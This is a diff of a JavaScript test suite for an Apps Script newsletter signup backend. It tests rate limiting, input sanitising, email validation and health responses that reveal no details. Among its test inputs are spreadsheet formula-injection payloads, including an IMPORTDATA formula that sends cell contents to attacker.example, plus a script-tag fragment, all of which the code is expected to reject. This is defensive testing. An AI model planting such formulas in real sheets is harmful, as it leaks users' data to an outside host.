@@ -192,12 +192,11 @@ describe('newsletter.gs: sheet writes hold the lock', () => {
   });
 
   it('a second subscribe for the same address reuses the row', () => {
-    const ctx = load();
-    ctx.doPost(req({ action: 'subscribe', email: 'new@x.io' }));
-    const first = find(ctx, 'new@x.io')[6];
-    ctx.doPost(req({ action: 'subscribe', email: 'new@x.io' }));
-    assert.deepEqual(emails(ctx), ['new@x.io']);
-    assert.notEqual(find(ctx, 'new@x.io')[6], first, 'fresh confirm token');
+    const ctx = load([row('old@x.io', 'pending', 1, { confirm: tok('1'), unsub: tok('2') })]);
+    assert.deepEqual(json(ctx.doPost(req({ action: 'subscribe', email: 'old@x.io' }))), { ok: true });
+    assert.deepEqual(emails(ctx), ['old@x.io']);
+    assert.notEqual(find(ctx, 'old@x.io')[6], tok('1'), 'fresh confirm token');
+    assert.deepEqual(ctx.rec.mails, ['old@x.io']);
   });
 
   it('subscribe for a confirmed address changes nothing and sends nothing', () => {
@@ -419,5 +418,117 @@ describe('newsletter.gs: bounce scan', () => {
     assert.equal(out.marked_bounced, 1);
     assert.equal(find(ctx, 'gone@x.io')[1], 'bounced');
     assert.equal(find(ctx, 'a@x.io')[1], 'confirmed');
+  });
+});
+
+describe('newsletter.gs: what a request can make it write, send or say', () => {
+  const sub = (ctx, fields) => json(ctx.doPost(req({ action: 'subscribe', ...fields })));
+
+  it('a repeat within ten minutes sends no second mail and keeps the first link working', () => {
+    const ctx = load();
+    assert.deepEqual(sub(ctx, { email: 'new@x.io' }), { ok: true });
+    const first = find(ctx, 'new@x.io')[6];
+    for (let i = 0; i < 5; i++) assert.deepEqual(sub(ctx, { email: 'new@x.io' }), { ok: true });
+    assert.deepEqual(ctx.rec.mails, ['new@x.io']);
+    assert.equal(find(ctx, 'new@x.io')[6], first);
+    assert.deepEqual(emails(ctx), ['new@x.io']);
+  });
+
+  it('stops sending confirmations at the day’s limit, still writes the row and says the same', () => {
+    const ctx = load();
+    vm.runInContext('MAX_CONFIRMATIONS_PER_DAY_ = 2;', ctx);
+    for (const email of ['a@x.io', 'b@x.io', 'c@x.io', 'd@x.io']) assert.deepEqual(sub(ctx, { email }), { ok: true });
+    assert.deepEqual(ctx.rec.mails, ['a@x.io', 'b@x.io']);
+    assert.deepEqual(emails(ctx), ['a@x.io', 'b@x.io', 'c@x.io', 'd@x.io']);
+    assert.equal(find(ctx, 'c@x.io')[1], 'pending');
+    assert.match(find(ctx, 'c@x.io')[6], /^[0-9a-f]{64}$/, 'the reminder can still carry its confirm link');
+    // Yesterday's count is dropped by the first sign-up of a new day.
+    assert.deepEqual(Object.keys(ctx.rec.props).filter((k) => k.startsWith('confirm_mails:')), ['confirm_mails:2026-11-10']);
+  });
+
+  it('keeps only a site path as the source', () => {
+    const ctx = load();
+    const cases = [
+      ['a@x.io', '/blog/a-lesson/', '/blog/a-lesson/'],
+      ['b@x.io', '/hi/free/loan-comparison/', '/hi/free/loan-comparison/'],
+      ['c@x.io', '=IMPORTDATA("https://attacker.example/?"&A2)', ''],
+      ['d@x.io', '+1+1', ''],
+      ['e@x.io', '@SUM(A1:A9)', ''],
+      ['f@x.io', '/blog/?q=<script>', ''],
+      ['g@x.io', `/${'a'.repeat(300)}`, ''],
+      ['h@x.io', 'https://example.com/', ''],
+      ['i@x.io', undefined, ''],
+    ];
+    for (const [email, source] of cases) sub(ctx, { email, source });
+    for (const [email, , kept] of cases) assert.equal(find(ctx, email)[2], kept, String(email));
+  });
+
+  it('refuses an address that a spreadsheet would read as a formula, or that is not one address', () => {
+    const ctx = load();
+    for (const email of [
+      '=importdata("https://x.example/?a@b.c"&a2)', '=1+1@x.io', '+cmd@x.io', '-2+3@x.io', '@sum@x.io',
+      'a"b@x.io', "a'b@x.io", 'a(b)@x.io', 'a@x.io, b@y.io', 'a b@x.io', 'a@b', 'plain', `${'a'.repeat(250)}@x.io`,
+    ]) {
+      assert.deepEqual(sub(ctx, { email }), { ok: false, error: 'invalid_email' }, email);
+    }
+    assert.deepEqual(emails(ctx), []);
+    assert.deepEqual(ctx.rec.mails, []);
+  });
+
+  it('still takes ordinary addresses, tags, subdomains and other scripts', () => {
+    const ctx = load();
+    const good = ['a@x.io', 'first.last+tag@mail.example.co.uk', 'user_name-1@sub-domain.example.org', 'रमेश@उदाहरण.भारत', 'jörg@müller.de'];
+    for (const email of good) assert.deepEqual(sub(ctx, { email }), { ok: true }, email);
+    assert.deepEqual(emails(ctx), good);
+  });
+
+  it('health says ok or not, and nothing about the sheet or the account', () => {
+    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') })]);
+    Object.assign(ctx.rec.props, { FROM_NAME: 'nidhi', SITE_URL: 'https://nidhi.today' });
+    const out = json(ctx.doGet(req({ action: 'health' })));
+    assert.deepEqual(out, { ok: true, checks: {
+      script_properties: { ok: true }, web_app_url: { ok: true }, gmail_advanced_service: { ok: true },
+      sheet_access: { ok: true }, from_email_sendable: { ok: true },
+    } });
+    // Nothing but the check names: no address, no sheet name or size, no web app address.
+    assert.doesNotMatch(JSON.stringify(out), /@|nidhi|rows|example\.invalid|"tab"/i);
+  });
+
+  it('a failing check, and any other error, says nothing about why', () => {
+    const ctx = load();
+    ctx.rec.props.FROM_EMAIL = 'someone-else@example.com';
+    const health = json(ctx.doGet(req({ action: 'health' })));
+    assert.deepEqual(health.checks.from_email_sendable, { ok: false });
+    assert.equal(health.ok, false);
+    assert.doesNotMatch(JSON.stringify(health), /someone-else|updates@|alias/i);
+
+    delete ctx.rec.props.SHEET_ID;
+    const post = ctx.doPost(req({ action: 'subscribe', email: 'a@x.io' }));
+    assert.deepEqual(json(post), { ok: false, error: 'error' });
+    const get = ctx.doGet(req({ action: 'confirm', t: tok('1') }));
+    assert.doesNotMatch(get.html, /SHEET_ID|script property|Missing/);
+    assert.match(get.html, /Something went wrong/);
+  });
+
+  it('send_post does not name the account when its address cannot send', () => {
+    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') })]);
+    ctx.rec.props.FROM_EMAIL = 'someone-else@example.com';
+    const body = JSON.stringify({ guid: 'g', subject: 'S', html: 'h', text: 't' });
+    assert.deepEqual(json(ctx.doPost(req({ action: 'send_post', sig: sign(body) }, body))), { ok: false, error: 'from_email_not_sendable' });
+  });
+
+  it('the count token is read from the body only, and not hashed when too long', () => {
+    const TOKEN = 'a-test-count-token';
+    const ctx = load([row('a@x.io', 'confirmed', 3, { unsub: tok('1') }), row('b@x.io', 'pending', 1, { confirm: tok('2') })]);
+    vm.runInContext(`COUNT_TOKEN_SHA256_ = '${crypto.createHash('sha256').update(TOKEN).digest('hex')}';`, ctx);
+    const inBody = (fields) => ({ parameter: fields, postData: { contents: new URLSearchParams(fields).toString() } });
+    assert.deepEqual(json(ctx.doPost(inBody({ action: 'count', token: TOKEN }))), { ok: true, count: 1 });
+    // In the address only: refused.
+    assert.deepEqual(json(ctx.doPost({ parameter: { action: 'count', token: TOKEN }, postData: { contents: 'action=count' } })), { ok: false, error: 'forbidden' });
+    let hashed = 0;
+    const digest = ctx.Utilities.computeDigest;
+    ctx.Utilities.computeDigest = (...a) => { hashed++; return digest(...a); };
+    assert.deepEqual(json(ctx.doPost(inBody({ action: 'count', token: 'x'.repeat(129) }))), { ok: false, error: 'forbidden' });
+    assert.equal(hashed, 0);
   });
 });
